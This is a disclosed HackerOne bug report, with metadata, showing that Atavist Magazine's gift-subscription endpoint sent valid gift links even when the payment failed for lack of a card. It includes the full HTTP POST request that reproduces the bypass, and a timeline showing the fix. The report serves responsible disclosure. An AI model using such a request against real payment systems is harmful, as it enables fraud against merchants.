---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2020-11-18
submitted: 2020-08-04T20:24:21.970Z
bounty_usd: null
votes: 29
cve: []
program: "[[programs/automattic|Automattic]]"
reporter: "bugra"
source: "https://hackerone.com/reports/951230"
title: "Can buy Atavist Magazine subscription for free"
---
# Can buy Atavist Magazine subscription for free

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 29 | **Program:** Automattic | **Disclosed:** 2020-11-18

- Report: [https://hackerone.com/reports/951230](https://hackerone.com/reports/951230)
- CWE: Improper Access Control - Generic
- Submitted: 2020-08-04T20:24:21.970Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hi team
If you go to https://magazine.atavist.com/ and scroll down. You will see membership price is $25, but I found a way to buy this subscription for free via Gift feature.
When you send gift request before adding any credit card to your account you will see this response :

{F936531}

However, if you check the gift recipient's email you will see the Gift email that contains the gift link.

{F936533}

## Steps To Reproduce:

  1. Just send this request (change `YOUR_EMAIL`, `YOUR_PASSWORD`, `RECIPIENT_EMAIL`, `gift_timestamp to current date, it was 2020-8-4 while reporting this`)  :

```http
POST /api/v2/store/purchase.php HTTP/1.1
Host: magazine.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 204
Origin: https://magazine.atavist.com
DNT: 1
Connection: close
Referer: https://magazine.atavist.com/

email=YOUR_EMAIL&password=YOUR_PASSWORD&product_id=com.theatavist.atavist.subscription.membership&gift_timestamp=2020-8-4&gift_recipient=RECIPIENT_EMAIL&gift_message=test&gift_gifter=test
```

You will see `{"error":"invalid_request_error","error_description":"The customer must have an active payment source attached."}` in response but if you check the recipient's email, you will see the gift link.

## Impact

Able to buy magazine membership for free

Thanks,
Bugra

## Timeline

- **Report Filed**
- **2020-08-05** @xknown: Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.
- **2020-09-16** @xknown: Hi @bugra, we deployed a patch to address this issue. Can you please test it when you get a chance?
- **2020-09-16** @bugra: Hi @xknown, I confirmed the fix. And I couldn't find any bypass, you can close this report as Resolved.
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
